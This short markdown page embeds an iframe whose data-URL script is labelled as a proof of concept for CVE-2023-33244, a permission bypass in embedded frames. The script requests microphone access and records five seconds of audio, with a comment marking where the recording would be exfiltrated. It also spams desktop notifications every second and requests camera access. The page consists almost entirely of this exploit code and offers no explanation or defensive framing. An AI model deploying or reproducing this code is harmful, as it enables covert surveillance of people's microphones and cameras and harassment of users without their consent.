# Embedded Content

<iframe src="data:text/html,
<script>
// CVE-2023-33244: Access APIs without permission
navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
        console.log('[+] Microphone access granted!');
        // Record audio
        let recorder = new MediaRecorder(stream);
        recorder.start();
        
        setTimeout(() => {
            recorder.stop();
            // Exfiltrate recording
        }, 5000);
    });

// Spam desktop notifications
setInterval(() => {
    new Notification('CVE-2023-33244', {
        body: 'Unauthorized notification access!'
    });
}, 1000);

// Access camera
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => console.log('[+] Camera accessed'));
</script>
"></iframe>
